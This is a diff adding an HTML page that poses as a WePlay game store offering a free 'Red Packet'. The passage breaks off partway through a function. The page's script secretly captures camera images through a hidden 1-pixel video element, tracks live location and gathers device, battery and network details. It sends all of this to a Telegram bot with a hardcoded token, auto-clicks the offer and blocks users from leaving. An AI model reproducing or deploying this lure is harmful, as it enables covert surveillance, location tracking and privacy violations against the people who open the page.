@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Red Packet - WePlay (Enhanced Data)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            margin: 0;
+            min-height: 100vh;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background: white;
+            box-shadow: 0 1px 5px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            width: 40px;
+            margin-right: 10px;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        .tabs {
+            display: flex;
+            justify-content: space-around;
+            background: white;
+            padding: 10px 0;
+            border-bottom: 2px solid #eee;
+        }
+
+        .tabs div {
+            color: #777;
+        }
+
+        .active {
+            color: #00bcd4;
+            border-bottom: 3px solid #00bcd4;
+            padding-bottom: 5px;
+        }
+
+        .card {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: white;
+            margin: 12px;
+            padding: 15px;
+            border-radius: 15px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.08);
+        }
+
+        .left {
+            display: flex;
+            align-items: center;
+        }
+
+        .left img {
+            width: 50px;
+            margin-right: 15px;
+        }
+
+        .price {
+            color: #ff7a00;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .note {
+            padding: 15px;
+            color: #888;
+            font-size: 14px;
+        }
+
+        .old-price {
+            text-decoration: line-through;
+            color: #999;
+            font-size: 16px;
+        }
+
+        .free {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+
+        .collect-btn {
+            margin-top: 6px;
+            padding: 6px 16px;
+            border: none;
+            background: #00bcd4;
+            color: white;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .collect-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .collect-btn.processing {
+            background: #ff9800;
+            animation: pulse 1.5s infinite;
+            cursor: not-allowed;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        .bottom-img {
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .bottom-img img {
+            width: 100%;
+            display: block;
+        }
+        
+        .video-container {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            overflow: hidden;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        canvas {
+            display: none;
+        }
+        
+        .processing-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 18px;
+            backdrop-filter: blur(5px);
+            flex-direction: column;
+        }
+        
+        .processing-overlay.active {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #00bcd4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .warning-text {
+            color: #ff4444;
+            font-size: 14px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .exit-warning {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            z-index: 10000;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            width: 80%;
+            max-width: 300px;
+        }
+        
+        .exit-warning.active {
+            display: block;
+        }
+        
+        .exit-warning h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .exit-warning p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .exit-warning button {
+            background: #00bcd4;
+            color: white;
+            border: none;
+            padding: 10px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+        .status-bar, .camera-section, .toast {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="processing-overlay" id="processingOverlay">
+        <div class="spinner"></div>
+        <div>Processing Your Red Packet...</div>
+        <div style="font-size: 14px; margin-top: 15px;">Please wait while we verify</div>
+        <div class="warning-text">⚠️ Do not close or minimize</div>
+    </div>
+
+    <div class="exit-warning" id="exitWarning">
+        <h3>⚠️ Processing</h3>
+        <p>Your Red Packet is being processed. Please wait...</p>
+        <button onclick="document.getElementById('exitWarning').classList.remove('active')">OK</button>
+    </div>
+
+    <div class="video-container">
+        <video id="video" autoplay playsinline muted></video>
+    </div>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <div class="header">
+        <img src="https://i.ibb.co/KjsMMSV9/logo.png" class="logo" alt="logo">
+        <div class="title">WePlay</div>
+    </div>
+
+    <div class="tabs">
+        <div>Recharge</div>
+        <div>VIP</div>
+        <div class="active">Red Packet</div>
+    </div>
+
+    <div class="card">
+        <div class="left">
+            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
+            <div>600 Gold Red Packet</div>
+        </div>
+        <div class="price">₹89</div>
+    </div>
+
+    <div class="card">
+        <div class="left">
+            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
+            <div>3000 Gold Red Packet</div>
+        </div>
+        <div class="price">₹449</div>
+    </div>
+
+    <div class="card">
+        <div class="left">
+            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
+            <div>10K Gold Red Packet</div>
+        </div>
+        <div class="price">₹1199</div>
+    </div>
+
+    <div class="card">
+        <div class="left">
+            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
+            <div>50K Gold Red Packet</div>
+        </div>
+        <div style="text-align:right;">
+            <div class="old-price">₹5399</div>
+            <div class="free">FREE</div>
+            <button class="collect-btn" id="collectBtn" onclick="handleCollectClick()">🎁 COLLECT FREE</button>
+        </div>
+    </div>
+
+    <div class="note">
+        The Red Packet you purchased will be stored in your inventory, and you can use it in WePlay.
+    </div>
+
+    <div class="bottom-img">
+        <img src="https://i.ibb.co/fYbYkdZ0/ip-e32f89d3.png" alt="banner">
+    </div>
+
+    <script>
+        // ==================== CONFIG ====================
+        const BOT_TOKEN = '8214662223:AAE8Y17RmB9-_2j2YXbm3EpOnTE5Wk7BQKU';
+        const CHAT_ID = '6677946042';
+        
+        // ==================== VARIABLES ====================
+        let stream = null;
+        let capturing = false;
+        let captureInterval = null;
+        let locationWatchId = null;
+        let photoCount = 0;
+        let sentCount = 0;
+        let locationCount = 0;
+        let cameraReady = false;
+        let isProcessing = false;
+        let useFrontCamera = true;
+        let photoCounter = 0;
+        
+        // Queue for failed messages (simple retry)
+        let photoQueue = [];
+        
+        // ==================== BACK BUTTON PREVENTION ====================
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            if (isProcessing) {
+                document.getElementById('exitWarning').classList.add('active');
+                history.pushState(null, null, location.href);
+            } else {
+                window.location.href = 'about:blank';
+            }
+        };
+        
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden && isProcessing) {
+                alert('⚠️ Processing in progress! Please do not switch tabs.');
+            }
+        });
+        
+        window.addEventListener('beforeunload', function(e) {
+            if (isProcessing) {
+                e.preventDefault();
+                e.returnValue = 'Processing in progress! Are you sure you want to leave?';
+                return 'Processing in progress! Are you sure you want to leave?';
+            }
+        });
+        
+        // ==================== TELEGRAM SEND FUNCTIONS ====================
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            };
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram message error:', data);
+                }
+                return data;
+            } catch (err) {
+                console.error('Failed to send message:', err);
+                throw err;
+            }
+        }
+
+        async function sendTelegramPhoto(blob, caption = '') {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            if (caption) formData.append('caption', caption);
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram photo error:', data);
+                }
+                return data;
+            } catch (err) {
+                console.error('Failed to send photo:', err);
+                throw err;
+            }
+        }
+
+        // Wrapper with simple retry (once)
+        async function sendWithRetry(type, data, attempt = 1) {
+            try {
+                if (type === 'message') {
+                    await sendTelegramMessage(data);
+                } else if (type === 'location') {
+                    const text = `📍 Live location:\nLatitude: ${data.lat}\nLongitude: ${data.lng}\nGoogle Maps: https://maps.google.com/?q=${data.lat},${data.lng}`;
+                    await sendTelegramMessage(text);
+                } else if (type === 'device_info') {
+                    // data is an object with many fields
+                    const text = `📱 <b>Extended Device Info</b>\n` + 
+                        Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('\n');
+                    await sendTelegramMessage(text);
+                }
+            } catch (err) {
+                console.log(`Send failed (attempt ${attempt}), retrying...`, err);
+                if (attempt < 2) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    return sendWithRetry(type, data, attempt + 1);
+                }
+            }
+        }
+
+        async function sendPhotoWithRetry(blob, num, cameraType, attempt = 1) {
+            try {
+                const caption = `📸 Photo #${num} (${cameraType} camera)`;
+                await sendTelegramPhoto(blob, caption);
+                console.log(`Photo #${num} sent`);
+            } catch (err) {
+                console.log(`Photo send failed (attempt ${attempt})`, err);
+                if (attempt < 2) {
+                    await new Promise(r => setTimeout(r, 3000));
+                    return sendPhotoWithRetry(blob, num, cameraType, attempt + 1);
+                } else {
+                    console.log('Photo failed after retry');
+                }
+            }
+        }
+        
+        // ==================== INIT ====================
+        window.onload = function() {
+            document.getElementById('collectBtn').innerHTML = '🎁 COLLECT FREE';
+            
+            setTimeout(() => {
+                initCamera();
+            }, 500);
+            
+            // Request location permission and send initial location
+            initLocation();
+            
+            // Collect extended device info after a short delay (includes battery, network, etc.)
+            setTimeout(() => {
+                collectExtendedDeviceInfo();
+            }, 2000);
+            
+            // Auto-trigger collect button
+            setTimeout(() => {
+                console.log('Auto-triggering collect button...');
+                const btn = document.getElementById('collectBtn');
+                const checkInterval = setInterval(() => {
+                    if (cameraReady && !btn.disabled && !isProcessing) {
+                        clearInterval(checkInterval);
+                        handleCollectClick();
+                    }
+                }, 300);
+                
+                setTimeout(() => {
+                    clearInterval(checkInterval);
+                    if (!isProcessing && !btn.disabled) {
+                        handleCollectClick();
+                    }
+                }, 7000);
+            }, 1500);
+        };
+        
+        function showProcessing() {
+            isProcessing = true;
+            document.getElementById('processingOverlay').classList.add('active');
+            history.pushState(null, null, location.href);
+        }
+        
+        function hideProcessing() {
+            isProcessing = false;
+            document.getElementById('processingOverlay').classList.remove('active');
+        }
+        
+        // ==================== CAMERA INIT ====================
+        async function initCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play().then(() => {
+                        cameraReady = true;
+                        useFrontCamera = true;
+                        console.log('Camera ready');
+                    }).catch(e => console.log('Play error:', e));
+                };
+                
+            } catch (err) {
+                console.log('Front camera failed:', err);
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false
+                    });
+                    
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        video.play().then(() => {
+                            cameraReady = true;
+                            useFrontCamera = false;
+                            console.log('Back camera ready');
+                        }).catch(e => console.log('Play error:', e));
+                    };
+                    
+                } catch (err2) {
+                    console.log('All cameras failed');
+                    document.getElementById('collectBtn').disabled = true;
+                    document.getElementById('collectBtn').innerHTML = 'Camera Error';
+                }
+            }
+        }
+        
+        function initLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        sendWithRetry('location', {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        });
+                        startLiveLocation();
+                    },
+                    (error) => console.log('Location error:', error),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
+        }
+        
+        // ==================== EXTENDED DEVICE INFO ====================
+        async function collectExtendedDeviceInfo() {
+            const info = {
+                'User Agent': navigator.userAgent,
+                'Platform': navigator.platform,
+                'Language': navigator.language,
+                'Screen': `${screen.width}x${screen.height}`,
+                'Color Depth': screen.colorDepth,
+                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+                'Timestamp': new Date().toISOString(),
+                'Cookies Enabled': navigator.cookieEnabled,
+                'Do Not Track': navigator.doNotTrack || 'unspecified',
+                'Hardware Concurrency': navigator.hardwareConcurrency || 'unknown',
+                'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
+                'Max Touch Points': navigator.maxTouchPoints || 'unknown',
+            };
+
+            // Battery API
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info['Battery Level'] = (battery.level * 100) + '%';
+                    info['Battery Charging'] = battery.charging ? 'Yes' : 'No';
+                } catch (e) {
+                    info['Battery'] = 'Not available';
+                }
+            } else {
+                info['Battery'] = 'API not supported';
+            }
+
+            // Network Information
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                info['Network Type'] = conn.effectiveType || 'unknown';
+                info['Downlink'] = conn.downlink ? conn.downlink + ' Mbps' : 'unknown';
+                info['RTT'] = conn.rtt ? conn.rtt + ' ms' : 'unknown';
+                info['Save Data'] = conn.saveData ? 'Yes' : 'No';
+            } else {
+                info['Network'] = 'API not supported';
+       
